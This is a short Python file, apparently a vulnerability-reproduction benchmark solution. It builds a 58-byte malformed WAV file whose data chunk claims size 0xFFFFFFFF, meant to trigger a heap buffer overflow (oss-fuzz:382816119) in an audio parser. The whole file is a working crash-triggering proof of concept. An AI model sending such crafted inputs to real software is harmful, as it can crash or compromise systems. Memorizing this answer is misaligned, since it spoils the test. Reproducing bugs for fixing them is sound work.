import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability corresponds to oss-fuzz:382816119 where data size 
        is not properly checked against the end of the RIFF chunk.
        
        Structure:
        1. RIFF Header (12 bytes)
        2. fmt chunk (24 bytes)
        3. data chunk (8 bytes header + 14 bytes payload = 22 bytes)
        Total: 58 bytes
        """
        
        # RIFF Header
        # ChunkID: "RIFF"
        # ChunkSize: 50 (0x32000000) -> Matches total file size of 58 bytes (50 + 8)
        # Format: "WAVE"
        riff_header = b'RIFF\x32\x00\x00\x00WAVE'
        
        # fmt Chunk
        # Subchunk1ID: "fmt "
        # Subchunk1Size: 16 (PCM standard)
        # AudioFormat: 1 (PCM)
        # NumChannels: 1
        # SampleRate: 44100 (0x0000AC44)
        # ByteRate: 88200 (0x00015888) -> SampleRate * NumChannels * BitsPerSample/8
        # BlockAlign: 2 -> NumChannels * BitsPerSample/8
        # BitsPerSample: 16
        # Packed: <HHIIHH
        fmt_chunk = b'fmt \x10\x00\x00\x00' + struct.pack('<HHIIHH', 1, 1, 44100, 88200, 2, 16)
        
        # data Chunk
        # Subchunk2ID: "data"
        # Subchunk2Size: 0xFFFFFFFF -> This large size triggers the vulnerability because 
        # it exceeds the remaining RIFF chunk size and is not properly checked.
        # Payload: 14 bytes of padding to reach the ground-truth length of 58 bytes.
        data_header = b'data\xff\xff\xff\xff'
        data_payload = b'\x00' * 14
        
        return riff_header + fmt_chunk + data_header + data_payload